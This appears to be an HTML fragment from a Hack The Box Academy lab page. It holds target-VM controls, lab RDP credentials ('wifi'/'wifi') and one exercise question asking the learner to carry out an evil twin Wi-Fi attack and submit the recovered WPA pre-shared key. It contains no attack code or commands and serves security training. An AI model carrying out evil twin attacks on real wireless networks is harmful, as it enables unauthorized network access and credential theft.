<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2834 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2834"><span class="badge badge-soft-dark font-size-14 mr-2">+ 5 <i class="fad fa-cube text-success"></i></span> Perform the evil twin attack as demonstrated in this section. What is the discovered value of the WPA PSK?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2834" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2834">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2834" id="btnAnswer2834">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
